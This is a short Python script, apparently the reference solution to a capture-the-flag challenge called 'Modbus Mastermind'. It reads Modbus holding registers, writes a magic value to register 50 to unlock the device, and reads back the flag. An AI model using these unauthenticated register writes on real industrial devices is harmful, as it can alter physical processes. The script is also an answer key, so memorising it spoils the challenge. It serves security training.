#!/usr/bin/env python3
"""Reference solver for Modbus Mastermind. Usage: solve.py [host] [port]"""
import sys
from pymodbus.client import ModbusTcpClient

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

c = ModbusTcpClient(host, port=port, timeout=5)
c.connect()


def rd(addr, n):
    return c.read_holding_registers(addr, count=n).registers


def ascii_of(regs):
    return "".join(chr(r) for r in regs)


print("breadcrumb:", ascii_of(rd(0, 23)))     # FLAG@100+200 ARM50=C0DE
part1 = ascii_of(rd(100, 18))                  # readable immediately
c.write_register(50, 0xC0DE)                   # arm the device
part2 = ascii_of(rd(200, 17))                  # now readable
print("FLAG:", part1 + part2)
c.close()
